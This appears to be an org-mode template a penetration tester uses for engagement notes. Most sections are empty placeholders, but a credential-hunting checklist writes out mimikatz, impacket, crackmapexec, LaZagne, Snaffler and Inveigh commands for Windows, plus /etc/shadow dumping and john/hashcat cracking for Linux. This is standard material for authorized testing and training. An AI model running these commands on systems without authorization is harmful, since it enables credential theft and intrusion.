#+title: Pentest Notes & Todo List
#+AUTHOR: MDB Dev
#+DESCRIPTION: Pentest Notes & Todo List
#+auto_tangle: t
#+STARTUP: showeverything

* NOTE Reconnection Steps:
:PROPERTIES:
:ID:       727d5790-878b-4497-910d-183986c181b5
:END:
1. Do x
2.
* Sanity Check:
:PROPERTIES:
:ID:       fa80888e-5275-4155-af5c-511c04cb3889
:END:
** What do we know?
:PROPERTIES:
:ID:       8c60be34-d664-4001-8a66-00697a6d58a5
:END:
+Do you need to enumerate more?+
  1.
  2.
** What did I learn?
:PROPERTIES:
:ID:       5a666c73-1f83-4b6e-98a6-3210367d5e88
:END:
  1.
  2.
  3.
** What silly mistakes did I make?
:PROPERTIES:
:ID:       849b05fc-6fd5-4279-8fbf-869a2e7bfa82
:END:
  1.
  2.

* NOTES:
:PROPERTIES:
:ID:       6fb0b403-5b57-4b48-b7b8-45cada6359c8
:END:
* Found Hosts (ips):
:PROPERTIES:
:header-args: :tangle IPS.txt :mkdirp yes :perms
:ID:       208d562b-99aa-4966-9273-afbfb2e52bf6
:END:
#+begin_src shell


#+end_src

* Found URLS:
:PROPERTIES:
:header-args: :tangle Urls.txt :mkdirp yes :perms
:ID:       908db516-4a2b-4661-91e4-40ff8fd885fd
:END:
- RUN everytime you find a new url!
  - ~for url in $(cat Urls.txt); do nikto -h "$url"; done~
#+begin_src shell
#+end_src
* +TODO-LIST+: [0/3]
:PROPERTIES:
:ID:       26f17e2a-15b0-486f-92f5-80e8c7ea9afa
:END:
** NEXT Actions [/]:
:PROPERTIES:
:ID:       f0a0333d-00b3-418c-bf91-589ca4131434
:END:
** TODO
:PROPERTIES:
:ID:       c42736a2-12b4-4698-8a2b-20eb065e9f48
:END:
** TODO
:PROPERTIES:
:ID:       badcc277-4e00-4a28-a37a-6a7fd5fd19e1
:END:
** TODO
:PROPERTIES:
:ID:       ed957676-965a-4b1b-8edd-e69ecd7508e9
:END:
** DONE:
:PROPERTIES:
:ID:       daa15b84-4ae1-46d6-86f7-3eddc238a38f
:END:

* TODO Cred Hunt Every Host!!!
:PROPERTIES:
:ID:       6e961a62-7f8b-4e47-ae64-152c2a65bdc2
:END:
- These are easy wins and not a substitute for manually searching ourselves.
- Copy the checklist to each hosts note section and ensure performed.
** Windows Pillaging [0/7]:
:PROPERTIES:
:ID:       99c501b5-d2fd-4bc1-8d8e-0001d651e558
:END:
- [ ] *mimikatz.exe*
  - [ ] _Pull creds/hashes from_ [[id:93ff5fc6-ee8d-4450-b463-2d1223c09080][LSASS]]:
    1. [ ] sekurlsa::minidump lsass.dmp
    2. [ ] sekurlsa::logonpasswords
  - [ ] _Export Kerberos Tickets_:
    - [ ] sekurlsa::tickets /export
  - [ ] _SAM_:
    - [ ] lsadump::sam
  - [ ] _Dump all clear text passwords_:
    - [ ] sekurlsa::logonpasswords
  - [ ] _Dump LSA Secrets_ (Different to above do both)
    - [ ] lsadump::secrets
- [ ] *Dump Hashes Impacket*:
  - [ ] impacket-secretsdump <Domain>/<user>:'<pass>'@<host> -dc-ip <DC-IP>
- [ ] *Dump NTDS.dit CME*
  - [ ] crackmapexec smb <ip> -u <username> -p '<password>'--ntds
- [ ] *LaZange Pillage Passwords*:
  - [ ] .\LaZagne.exe all -v
- [ ] *Snaffler*
  - [ ] Snaffler.exe -s -d <domain>.local -o <logFileName>.log -v data
- [ ] *LLMNR Poisoning*:
  - [ ] Inveigh.exe
    - [ ] .\Inveigh.exe
- [ ] [[id:98aa96c3-6d28-4fa0-894a-d4921c927a46][Manual Credential & file hunting in Windows:]]

** Linux Pillaging [0/7]:
:PROPERTIES:
:ID:       4138e9ee-807f-40da-ada8-f688913037ea
:END:
- [ ] *Dump Shadow Files* [0/4]:
  1. [ ] sudo cp /etc/passwd /tmp/passwd.bak
  2. [ ] sudo cp /etc/shadow /tmp/shadow.bak
  3. [ ] unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
  4. [ ] Then use [[id:ae66bd84-6b57-4f92-9bb7-eca150f47435][Hashcat]] to crack the file or john.
     - john --wordlist=~/Wordlists/rockyou.txt unshadowed.hashes
     - hashcat -m 500 unshadowed.hashes ~/Wordlists/rockyou.txt
     - hashcat -m 1800 unshadowed.hashes ~/Wordlists/rockyou.txt
       - If sha512crypt ($6)
     - +Note+: Sometimes the hashes will not be in md5crypt format (500 in hashcat) if so check what format they are in using john or hashes.com then find relevant hash
- [ ] *Check for SSH Keys*:
  - [ ] Root
  - [ ] Users
- [ ] Bashrc
- [ ] Bash History
- [ ] Mysql conf files.
- [ ] WebServers
- [ ] [[id:d574913e-857f-4028-ad80-14fd94e9d538][Search for credentials in Linux Files:]]
